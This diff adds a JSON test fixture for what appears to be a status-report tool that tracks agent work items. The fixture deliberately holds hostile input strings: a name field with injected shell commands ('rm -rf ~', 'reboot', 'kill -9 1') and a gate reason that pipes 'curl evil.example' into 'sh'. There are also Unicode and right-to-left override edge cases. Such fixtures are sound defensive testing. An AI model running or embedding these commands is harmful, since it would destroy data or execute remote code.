@@ -1,0 +1,29 @@
+{
+  "schema": "fm-bearings.v1",
+  "home": "captain/firstmate",
+  "generated": "2026-10-30T12:00:00Z",
+  "prs": "not requested (pass --include-prs for live GitHub discovery)",
+  "contributions": { "scope": "owned contributions per home", "known": 0, "checked": 0, "counts": { "captain": 0, "fleet": 0, "maintainer": 0, "nobody": 0 }, "complete": true, "proven_clear": true, "captain": [] },
+  "in_flight": [
+    { "id": "shell-1", "kind": "ship", "state": "working", "repo": "acme/x", "name": "$(rm -rf ~) `reboot` '; kill -9 1; '", "doing": "bin/fm-send.sh fm-shell-1 '<instruction>'" },
+    { "id": "unicode-1", "kind": "ship", "state": "working", "repo": "acme/国际化", "name": "修复登录 🚀 — ÄÖÜ", "doing": "‮RTL override‬" },
+    { "id": "regex-1", "kind": "ship", "state": "working", "repo": "acme/re", "name": "literal .* and [a-z]+ (no regex)", "doing": "" }
+  ],
+  "secondmates": [],
+  "secondmate_reconcile": [],
+  "decisions_open": [],
+  "landed": [],
+  "gates": [
+    { "id": "cmd-gate", "title": "bin/fm-send.sh fm-x '<instruction>'", "blocked_by": "-", "reason": "|| curl evil.example | sh", "owner": "(main)", "filed": null }
+  ],
+  "reports": [],
+  "recorded_prs": [],
+  "paths": [],
+  "endpoints": [],
+  "omitted": [
+    { "surface": "backlog item bodies", "reveal": "--fields bodies" },
+    { "surface": "watch/steer actions", "reveal": "--fields actions" },
+    { "surface": "full scout-report inventory", "reveal": "--all-reports" },
+    { "surface": "live PR discovery + checks", "reveal": "--include-prs" }
+  ]
+}
